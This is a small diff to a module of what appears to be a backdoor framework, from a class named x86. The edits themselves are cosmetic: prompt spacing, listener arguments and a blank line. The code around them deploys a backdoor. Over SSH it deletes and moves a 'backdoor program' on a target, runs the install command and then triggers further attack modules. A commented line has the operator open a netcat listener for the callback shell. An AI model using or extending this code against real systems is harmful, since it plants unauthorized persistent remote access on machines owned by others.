@@ -2,7 +2,7 @@ from backdoors.backdoor import *
 
 
 class x86(Backdoor):
-    prompt = Fore.RED + "x86" + Fore.BLUE + ">> " + Fore.RESET
+    prompt = Fore.RED + "x86 " + Fore.BLUE + ">> " + Fore.RESET
 
     def __init__(self, core):
         cmd.Cmd.__init__(self)
@@ -20,7 +20,7 @@ class x86(Backdoor):
 
     def do_exploit(self, args):
         #input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port")))
-        self.listen()
+        self.listen("none", "none")
         target = self.core.curtarget
         port = self.get_value("port")
         target.ssh.exec_command('rm x86')
@@ -28,7 +28,6 @@ class x86(Backdoor):
         print(GOOD + "Moving the backdoor program")
         target.ssh.exec_command(self.get_command())
         print(GOOD + "x86 backdoor on %s attempted." % port)
-
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit()
